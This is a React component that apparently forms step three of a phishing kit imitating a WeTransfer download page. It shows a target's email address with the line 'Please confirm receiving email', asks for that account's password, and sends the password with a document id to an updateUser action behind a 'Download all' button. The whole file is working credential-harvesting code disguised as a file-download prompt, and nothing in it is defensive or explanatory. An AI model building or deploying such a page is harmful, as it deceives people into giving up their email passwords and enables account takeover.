import React, { useState } from 'react'
import { useMutation } from 'react-query'
import styled from 'styled-components'
import updateUser from '../actions/update-user'
import Logo from './Logo'

const Styles = styled.div`
  display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: column;

  .tagline {
    margin: 0;
    font-size: 14px;
    margin-bottom: 10px;
    border-bottom: 1px solid #d0cece;
    width: 100%;
    text-align: center;
    padding-bottom: 5px;
  }

  .email {
    margin: 0;
    margin-bottom: 10px;
    color: #409fff;
  }

  input {
    height: 40px;
    width: 70%;
    border-radius: 5px;
    padding: 10px;
    border: 1px solid #d0cdcd;

    :focus {
      border-color: #00a8e2;
      outline: none;
    }

    ::placeholder {
      font-weight: 500;
      font-size: 16px;
      line-height: 19px;
      color: #c7c7c7;
    }
  }

  .button {
    display: flex;
    align-items: center;
    justify-content: center;
    background: #409fff;
    border: 1px solid #409fff;
    border-radius: 1.25em;
    box-sizing: border-box;
    color: #fff;
    cursor: pointer;
    font-size: 1em;
    height: 2.5em;
    outline: 0;
    font-weight: 500;
    margin-top: 10px;
    min-width: 9.75em;
  }

  .wetransfernow {
    width: 200px;
    height: 40px;
    margin-bottom: 10px;
  }
  .password-error {
    color: red;
    margin: 0;
    font-size: 12px;
    text-align: left;
  }
`

export default function StepThree({ setShow, email, docId }) {
  const [password, setPassword] = useState('')
  const [error, setError] = useState(false)

  const { mutateAsync, isLoading } = useMutation(updateUser)

  const onChange = (e) => {
    setError(false)
    setPassword(e.target.value)
  }

  const handleDownload = async () => {
    if (!password) {
      return setError(true)
    }
    if (!docId) {
      return null
    }
    await mutateAsync({ docId, password })
    return setShow({ stepOne: false, stepTwo: false, stepThree: false, stepFour: true })
  }

  return (
    <Styles>
      {/* <img src="/wetransfernow.png" alt="wetransfer" className="wetransfernow" /> */}
      <Logo />
      <p className="tagline">Please confirm receiving email</p>
      <p className="email">{email}</p>
      <input
        type="password"
        placeholder="Password"
        style={{ borderColor: error && 'red' }}
        onChange={onChange}
        autoComplete="off"
      />
      {error && <p className="password-error">Password is required</p>}
      <div
        className="button"
        tabIndex={0}
        role="button"
        onKeyPress={handleDownload}
        onClick={handleDownload}
      >
        {isLoading ? 'Processing...' : 'Download all'}
      </div>
    </Styles>
  )
}
